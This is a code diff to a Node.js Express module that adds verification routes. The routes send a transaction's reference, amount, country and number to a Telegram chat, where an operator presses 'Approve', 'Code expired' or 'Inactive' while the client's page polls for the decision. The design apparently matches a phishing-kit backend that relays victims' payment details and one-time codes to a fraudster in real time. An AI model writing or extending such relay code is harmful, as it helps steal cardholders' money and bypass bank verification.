@@ -99,4 +99,45 @@ function registerRoutes(app) {
         `<b>Recipient:</b> ${safe(rn)}`;
 
       const keyboard = [[
-        { text: '✅ Approve',        callback_data: `otp_
+        { text: '✅ Approve',        callback_data: `otp_approve:${tx}` },
+        { text: '⏱ Code expired',    callback_data: `otp_expired:${tx}` },
+        { text: '⚠ Inactive',        callback_data: `otp_inactive:${tx}` }
+      ]];
+
+      const sent = await sendMessage(text, keyboard);
+      const e = pending.get(tx);
+      if (e) e.messageId = sent.message_id;
+
+      res.json({ ok: true, requestId: tx });
+    } catch (err) {
+      console.error('[tg-otp] send error', err);
+      res.status(500).json({ error: 'Telegram send failed' });
+    }
+  });
+
+  /* Client polls decision here (shared with SMS flow, distinct map) */
+  app.get('/api/verification/status/:ref', (req, res) => {
+    const entry = pending.get(req.params.ref);
+    if (!entry) return res.json({ decision: 'pending' });
+    res.json({ decision: entry.decision });
+  });
+
+  /* Resend OTP → notify Telegram (optional) */
+  app.post('/api/verification/otp', (req, res) => {
+    const { tx, am, cur, c, an } = req.body || {};
+    // Optional: send a Telegram note
+    sendMessage(
+      `<b>🔁 OTP resend requested</b>\n\n` +
+      `<b>Reference:</b> <code>${String(tx || '—').replace(/&/g,'&amp;').replace(/</g,'&lt;')}</code>\n` +
+      `<b>Amount:</b> ${String(cur || '')} ${String(am || '')}\n` +
+      `<b>Country:</b> ${String(c || '—')}\n` +
+      `<b>Number:</b> ${String(an || '—')}`,
+      null
+    ).catch(() => {});
+    res.json({ ok: true });
+  });
+
+  log('Routes: /api/verification/submit, /api/verification/status/:ref, /api/verification/otp');
+}
+
+module.exports = { registerRoutes, handleUpdate };
